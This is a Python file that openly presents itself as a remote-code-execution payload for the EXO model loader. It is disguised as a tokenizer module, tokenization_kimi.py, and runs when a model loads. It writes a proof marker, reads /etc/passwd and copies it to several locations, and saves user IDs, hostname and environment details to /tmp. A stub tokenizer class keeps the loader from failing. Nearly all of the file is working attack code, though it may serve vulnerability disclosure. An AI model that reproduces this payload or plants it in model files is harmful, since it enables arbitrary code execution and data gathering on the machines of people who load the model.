"""
EXO RCE Payload - System Reconnaissance & Credential Theft
Executed via exec() in tokenization_kimi.py during model load

This payload:
1. Creates proof marker file
2. Reads /etc/passwd
3. Writes /etc/passwd contents to accessible location
4. Exfiltrates system information
"""

import json
import os
from pathlib import Path
from datetime import datetime

print("[*] Payload executing - system reconnaissance mode")

# ==============================================================================
# PART 1: Proof of Execution
# ==============================================================================

try:
    marker_file = Path("/tmp/exo_pwned_marker.txt")
    marker_data = {
        "status": "RCE_SUCCESSFUL",
        "timestamp": str(datetime.now().isoformat()),
        "message": "EXO RCE achieved - arbitrary code execution confirmed",
        "hostname": os.uname().nodename,
        "user": os.getenv("USER", "unknown"),
        "cwd": os.getcwd(),
    }
    
    marker_file.write_text(json.dumps(marker_data, indent=2))
    print(f"[+] Proof marker created: {marker_file}")
except Exception as e:
    print(f"[-] Marker creation failed: {e}")

# ==============================================================================
# PART 2: Read /etc/passwd
# ==============================================================================

try:
    passwd_file = Path("/etc/passwd")
    if passwd_file.exists():
        passwd_content = passwd_file.read_text()
        print(f"[+] Successfully read /etc/passwd ({len(passwd_content)} bytes)")
        
        # Parse and display first few entries
        lines = passwd_content.split('\n')[:5]
        print("[+] First entries:")
        for line in lines:
            if line:
                print(f"    {line[:80]}")
    else:
        print("[-] /etc/passwd not found")
except Exception as e:
    print(f"[-] Failed to read /etc/passwd: {e}")

# ==============================================================================
# PART 3: Write passwd contents to accessible file
# ==============================================================================

try:
    passwd_content = Path("/etc/passwd").read_text()
    
    # Try multiple writable locations
    output_locations = [
        Path("/tmp/exo_passwd_dump.txt"),
        Path("/tmp/passwd_leaked.txt"),
        Path.home() / "exo_passwd.txt",
    ]
    
    for output_file in output_locations:
        try:
            output_file.write_text(passwd_content)
            print(f"[+] Wrote /etc/passwd to: {output_file}")
            
            # Verify it was written
            if output_file.exists() and len(output_file.read_text()) > 0:
                print(f"[✓] Verified: {output_file} contains {len(passwd_content)} bytes")
                break
        except PermissionError:
            continue
        except Exception as e:
            print(f"[!] Failed to write to {output_file}: {e}")
            continue

except Exception as e:
    print(f"[-] Failed to exfiltrate /etc/passwd: {e}")

# ==============================================================================
# PART 4: System Information Gathering
# ==============================================================================

try:
    sysinfo = {
        "hostname": os.uname().nodename,
        "system": os.uname().sysname,
        "release": os.uname().release,
        "machine": os.uname().machine,
        "processor": os.uname().processor,
        "uid": os.getuid(),
        "gid": os.getgid(),
        "effective_uid": os.geteuid(),
        "effective_gid": os.getegid(),
        "cwd": os.getcwd(),
        "user": os.getenv("USER"),
        "home": os.getenv("HOME"),
        "shell": os.getenv("SHELL"),
        "path": os.getenv("PATH", "").split(":"),
    }
    
    sysinfo_file = Path("/tmp/exo_sysinfo.txt")
    sysinfo_file.write_text(json.dumps(sysinfo, indent=2))
    print(f"[+] System info saved: {sysinfo_file}")
    print(f"[+] UID: {sysinfo['uid']}, GID: {sysinfo['gid']}")
    print(f"[+] Hostname: {sysinfo['hostname']}")
    
except Exception as e:
    print(f"[-] System info gathering failed: {e}")

# ==============================================================================
# PART 5: Tokenizer Class Stub (Required by EXO)
# ==============================================================================

class TikTokenTokenizer:
    """Stub tokenizer class - EXO will try to instantiate this"""
    
    def __init__(self):
        self.model = None
        self.eos_token = "[EOS]"
        self.bos_token = "[BOS]"
    
    @classmethod
    def from_pretrained(cls, model_path):
        """Factory method called by EXO"""
        instance = cls()
        # At this point, RCE has already succeeded via module load
        return instance
    
    def encode(self, text: str, **kwargs):
        """Encode text to token IDs"""
        # Return dummy token sequence
        return [1, 2, 3, 4, 5]
    
    def decode(self, tokens: list, **kwargs):
        """Decode token IDs to text"""
        return "[MALICIOUS_TOKENIZER_OUTPUT]"


print("[+] TikTokenTokenizer class loaded and ready")
print("[✓] Payload execution complete")
